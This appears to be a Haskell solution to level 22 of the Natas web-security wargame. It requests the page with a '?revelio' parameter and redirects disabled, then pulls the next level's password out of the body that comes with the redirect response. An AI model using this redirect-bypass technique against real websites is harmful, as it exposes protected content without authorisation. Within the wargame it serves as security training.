module Natas.Natas22 where

import           Control.Exception   (catchJust)

import           Data.Text           (Text)
import           Data.Text.Encoding  (decodeUtf8)
import           Safe                (headMay, lastMay)

import           Network.HTTP.Client (HttpException (HttpExceptionRequest),
                                      HttpExceptionContent (StatusCodeException))
import           Network.Wreq        (redirects)

import           Control.Lens

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  let req = getLevel' 22 (parentUri 22 ++ "/?revelio") (redirects .~ 0)
  caughtBody <- catchJust isStatusCodeExceptionBody (reqBody <$> req) pure
  attemptParse caughtBody

isStatusCodeExceptionBody :: HttpException -> Maybe Text
isStatusCodeExceptionBody (HttpExceptionRequest _req (StatusCodeException _resp bs)) =
  Just (decodeUtf8 bs)
isStatusCodeExceptionBody _exception = Nothing

attemptParse :: Text -> IO (Maybe Text)
attemptParse body =
  let match = headMay (workupBody' extractPassword body)
  in pure $ match >>= lastMay
